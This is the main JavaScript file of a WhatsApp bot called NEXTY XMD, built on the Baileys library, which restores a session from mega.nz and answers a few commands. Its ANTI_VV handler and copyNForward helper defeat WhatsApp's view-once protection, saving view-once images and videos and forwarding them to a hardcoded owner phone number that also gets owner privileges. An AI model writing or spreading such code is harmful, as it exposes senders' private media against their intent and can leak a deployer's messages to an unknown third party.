const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys');

const fs = require('fs');
const path = require('path');
const os = require('os');
const axios = require('axios');
const P = require('pino');
const { File } = require('megajs');
const FileType = require('file-type');
const express = require("express");

// Custom modules
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { sms, downloadMediaMessage } = require('./lib/msg');
const config = require('./config');

const app = express();
const port = process.env.PORT || 9090;

// Initialize express
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const prefix = config.PREFIX;
const ownerNumber = ['923192084504']; // Updated owner number

// Temporary directory management
const tempDir = path.join(os.tmpdir(), 'nexty-xmd-cache'); // Changed to nexty-xmd
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir, { recursive: true });
}

// Clear temp files older than 5 minutes
const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) {
      console.error('Error reading temp directory:', err);
      return;
    }
    
    const now = Date.now();
    files.forEach(file => {
      const filePath = path.join(tempDir, file);
      fs.stat(filePath, (err, stats) => {
        if (!err && (now - stats.mtimeMs) > 5 * 60 * 1000) {
          fs.unlink(filePath, err => {
            if (err) console.error('Error deleting temp file:', err);
          });
        }
      });
    });
  });
};

setInterval(clearTempDir, 5 * 60 * 1000);

// Session management
const ensureSession = async () => {
  const sessionPath = path.join(__dirname, 'sessions', 'creds.json');
  
  if (!fs.existsSync(sessionPath)) {
    if (!config.SESSION_ID) {
      throw new Error('SESSION_ID environment variable is required');
    }
    
    try {
      const sessdata = config.SESSION_ID.replace("Nextyxmd~", ''); // Changed to Nextyxmd
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
      
      await new Promise((resolve, reject) => {
        filer.download((err, data) => {
          if (err) return reject(err);
          fs.writeFile(sessionPath, data, (err) => {
            if (err) return reject(err);
            console.log("Session downloaded successfully ✓");
            resolve();
          });
        });
      });
    } catch (error) {
      console.error('Session download failed:', error);
      throw error;
    }
  }
};

// Utility functions
const getSizeMedia = (buffer) => {
  return buffer.length;
};

// Main connection function
async function connectToWA() {
  try {
    await ensureSession();
    
    console.log("Connecting NEXTY XMD to WhatsApp ⚡..."); // Changed to NEXTY XMD
    const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'));
    const { version } = await fetchLatestBaileysVersion();

    const conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.macOS("Firefox"),
      syncFullHistory: true,
      auth: state,
      version
    });

    // Connection event handling
    conn.ev.on('connection.update', (update) => {
      const { connection, lastDisconnect } = update;
      
      if (connection === 'close') {
        const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
        console.log(`Connection closed. ${shouldReconnect ? 'Reconnecting...' : 'Logged out.'}`);
        
        if (shouldReconnect) {
          setTimeout(connectToWA, 5000);
        }
      } else if (connection === 'open') {
        console.log('🟢 Installing NEXTY XMD Plugins'); // Changed to NEXTY XMD
        
        // Load plugins
        try {
          const pluginPath = path.join(__dirname, 'plugins');
          if (fs.existsSync(pluginPath)) {
            fs.readdirSync(pluginPath).forEach((plugin) => {
              if (path.extname(plugin).toLowerCase() === ".js") {
                require(path.join(pluginPath, plugin));
              }
            });
          }
          console.log('Plugins installed successfully ✓');
        } catch (error) {
          console.error('Error loading plugins:', error);
        }
        
        console.log('Bot connected to WhatsApp ✓');
        
        // Send welcome message - Updated to NEXTY XMD
        const welcomeMessage = `*Hello there 🌟 NEXTY 🌟 XMD 🌟 User! 👋🏻* \n\n> This is a user friendly WhatsApp bot created by NEXTY XMD. 🎊, Meet 🌟 NEXTY XMD 🌟 WhatsApp Bot.\n\n *Thanks for using 🌟 NEXTY 🌟 XMD 🌟 🚩* \n\n> Follow our GitHub Repository: 📖\n \nhttps://github.com/nextyall/NEXTY-XMD\n\n- *YOUR PREFIX:* = ${prefix}\n\nDon't forget to give star to our repo ⬇️\n\nhttps://github.com/nextyall/NEXTY-XMD\n\n> © Powered BY 🌟 NEXTY 🌟 XMD 🌟 🖤\n> Deployed by NEXTY XMD`;
        
        conn.sendMessage(conn.user.id, { 
          image: { url: `https://files.catbox.moe/jicpyd.jpg` }, 
          caption: welcomeMessage 
        }).catch(console.error);
      }
    });

    // Credentials update
    conn.ev.on('creds.update', saveCreds);

    // Message processing
    conn.ev.on('messages.upsert', async (mekData) => {
      try {
        const mek = mekData.messages[0];
        if (!mek.message) return;

        // Handle view once and ephemeral messages
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
          ? mek.message.ephemeralMessage.message 
          : mek.message;

        // Read receipt for messages
        if (config.READ_MESSAGE === 'true') {
          await conn.readMessages([mek.key]);
        }

        // Handle status updates
        if (mek.key && mek.key.remoteJid === 'status@broadcast') {
          if (config.AUTO_STATUS_SEEN === "true") {
            await conn.readMessages([mek.key]);
          }
          
          if (config.AUTO_STATUS_REPLY === "true") {
            const user = mek.key.participant;
            const text = `${config.AUTO_STATUS_MSG || "Thanks for the status update!"}`;
            await conn.sendMessage(user, { text, react: { text: '💙', key: mek.key } }, { quoted: mek });
          }
        }

        // Handle view once messages
        if (mek.message.viewOnceMessageV2 && config.ANTI_VV === "true") {
          const viewOnceContent = mek.message.viewOnceMessageV2.message;
          
          if (viewOnceContent.imageMessage) {
            const cap = viewOnceContent.imageMessage.caption;
            const mediaBuffer = await conn.downloadAndSaveMediaMessage(viewOnceContent.imageMessage);
            await conn.sendMessage(ownerNumber[0] + '@s.whatsapp.net', { 
              image: { url: mediaBuffer }, 
              caption: cap 
            }, { quoted: mek });
          } 
          else if (viewOnceContent.videoMessage) {
            const cap = viewOnceContent.videoMessage.caption;
            const mediaBuffer = await conn.downloadAndSaveMediaMessage(viewOnceContent.videoMessage);
            await conn.sendMessage(ownerNumber[0] + '@s.whatsapp.net', { 
              video: { url: mediaBuffer }, 
              caption: cap 
            }, { quoted: mek });
          }
        }

        // Extract message details
        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const from = mek.key.remoteJid;
        const sender = mek.key.fromMe ? conn.user.id : (mek.key.participant || mek.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net';
        const isMe = botNumber.includes(senderNumber);
        const isOwner = ownerNumber.includes(senderNumber) || isMe;
        const isGroup = from.endsWith('@g.us');
        
        // Get group metadata if it's a group
        let groupMetadata = {};
        let groupAdmins = [];
        let isBotAdmins = false;
        let isAdmins = false;
        
        if (isGroup) {
          try {
            groupMetadata = await conn.groupMetadata(from);
            groupAdmins = await getGroupAdmins(groupMetadata.participants);
            isBotAdmins = groupAdmins.includes(botNumber);
            isAdmins = groupAdmins.includes(sender);
          } catch (error) {
            console.error('Error fetching group metadata:', error);
          }
        }

        // Extract message body
        let body = '';
        if (type === 'conversation') {
          body = mek.message.conversation;
        } else if (type === 'extendedTextMessage') {
          body = mek.message.extendedTextMessage.text;
        } else if (type === 'imageMessage') {
          body = mek.message.imageMessage.caption || '';
        } else if (type === 'videoMessage') {
          body = mek.message.videoMessage.caption || '';
        }

        // Check if it's a command
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');

        // Helper function to reply
        const reply = (text) => {
          return conn.sendMessage(from, { text }, { quoted: mek });
        };

        // Add utility functions to conn object
        conn.decodeJid = (jid) => {
          if (!jid) return jid;
          if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
          } else {
            return jid;
          }
        };

        // Command handling logic would go here
        if (isCmd) {
          console.log(`Command received: ${command} from ${senderNumber}`);
          
          // Example command handling
          if (command === 'ping') {
            await reply('Pong! 🏓');
          }
          else if (command === 'owner') {
            await reply('🌟 NEXTY XMD 🌟\nOwner: +923192084504\nGitHub: https://github.com/nextyall/NEXTY-XMD');
          }
          else if (command === 'info') {
            await reply('🌟 NEXTY XMD BOT 🌟\nPowered by NEXTY XMD\nDeployed by NEXTY XMD\nGitHub: https://github.com/nextyall/NEXTY-XMD');
          }
          // Add more commands here
        }

      } catch (error) {
        console.error('Error processing message:', error);
      }
    });

    // Add other utility functions to conn object
    conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
      let vtype;
      if (options.readViewOnce) {
        message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message 
          ? message.message.ephemeralMessage.message 
          : (message.message || undefined);
        
        vtype = Object.keys(message.message.viewOnceMessage.message)[0];
        delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
        delete message.message.viewOnceMessage.message[vtype].viewOnce;
        message.message = {
          ...message.message.viewOnceMessage.message
        };
      }

      let mtype = Object.keys(message.message)[0];
      let content = await generateForwardMessageContent(message, forceForward);
      let ctype = Object.keys(content)[0];
      let context = {};
      
      if (mtype !== "conversation") context = message.message[mtype].contextInfo;
      content[ctype].contextInfo = {
        ...context,
        ...content[ctype].contextInfo
      };
      
      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
        ...content[ctype],
        ...options,
        ...(options.contextInfo ? {
          contextInfo: {
            ...content[ctype].contextInfo,
            ...options.contextInfo
          }
        } : {})
      } : {});
      
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
      return waMessage;
    };

    conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
      let quoted = message.msg ? message.msg : message;
      let mime = (message.msg || message).mimetype || '';
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
      
      const stream = await downloadContentFromMessage(quoted, messageType);
      let buffer = Buffer.from([]);
      
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
      }
      
      let type = await FileType.fromBuffer(buffer);
      let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
      
      // Save to file
      await fs.writeFileSync(trueFileName, buffer);
      return trueFileName;
    };

    // Add more utility functions as needed

  } catch (error) {
    console.error('Error in connectToWA:', error);
    setTimeout(connectToWA, 5000);
  }
}

// Error handling
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
});

// Start the bot
connectToWA();

// Start express server
app.get('/', (req, res) => {
  res.send('NEXTY XMD WhatsApp Bot is running!'); // Changed to NEXTY XMD
});

app.listen(port, () => {
  console.log(`NEXTY XMD server listening on port ${port}`); // Changed to NEXTY XMD
});

module.exports = { connectToWA };
